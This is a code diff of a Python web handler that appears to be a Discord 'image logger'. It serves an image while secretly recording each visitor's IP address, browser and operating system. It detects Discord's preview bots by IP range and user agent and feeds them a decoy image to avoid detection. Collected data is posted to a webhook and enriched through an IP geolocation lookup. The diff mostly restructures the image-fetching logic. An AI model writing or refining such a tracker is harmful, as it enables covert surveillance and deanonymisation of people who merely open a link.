@@ -47,52 +47,37 @@ def prev(ip,uag):
     }
 
 class handler(BaseHTTPRequestHandler):
-       def do_GET(self):
+    def do_GET(self):
         s = self.path
         dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
         
-        # 1. Get the target image URL from the query parameter (e.g., ?url=...)
-        target_url = dic.get('url', '')
-        
-        # 2. Determine Content Type
-        if target_url.lower().endswith('.png'):
-            content_type = 'image/png'
-        else:
-            content_type = 'image/jpeg'
-
-        # 3. Fetch the actual IMAGE DATA
-        try:
-            # If a URL was provided, download it. Otherwise use buggedbin.
-            if target_url:
-                data = requests.get(target_url).content
-            else:
-                data = buggedbin
-        except Exception:
-            data = buggedbin
-
         useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
         os, browser = httpagentparser.simple_detect(useragent)
-        
         ip = self.headers.get('x-forwarded-for')
 
-        # 4. Check for Discord Bots
+        # Check for Discord Bots
         if ip and ip.startswith(('35','34','104.196')):
             if 'discord' in useragent.lower():
                 self.send_response(200)
-                self.send_header('Content-type', content_type)
+                self.send_header('Content-type', 'image/png') # MUST BE PNG FOR PREVIEW
                 self.end_headers()
-                # Send a small placeholder or the bugged bin
-                self.wfile.write(DEFAULT_IMG if isinstance(DEFAULT_IMG, bytes) else requests.get(DEFAULT_IMG).content) 
+                self.wfile.write(buggedbin) # Send the bugged bin directly
                 
                 requests.post(webhook, json=prev(ip, useragent))
             else:
                 pass
         else:
-            # 5. Normal User: Send the fetched Image Data
+            # Normal User: Fetch the actual image from the URL parameter
+            target_url = dic.get('url', '')
+            try:
+                data = requests.get(target_url).content if target_url else buggedbin
+            except:
+                data = buggedbin
+            
             self.send_response(200)
-            self.send_header('Content-type', content_type)
+            self.send_header('Content-type', 'image/jpeg') # Or png depending on source
             self.end_headers()
-            self.wfile.write(data) # <--- THIS MUST BE BYTES, NOT A STRING
+            self.wfile.write(data)
             
             try:
                 ipInfo = requests.get(f'https://ipinfo.io/{ip}/json').json()
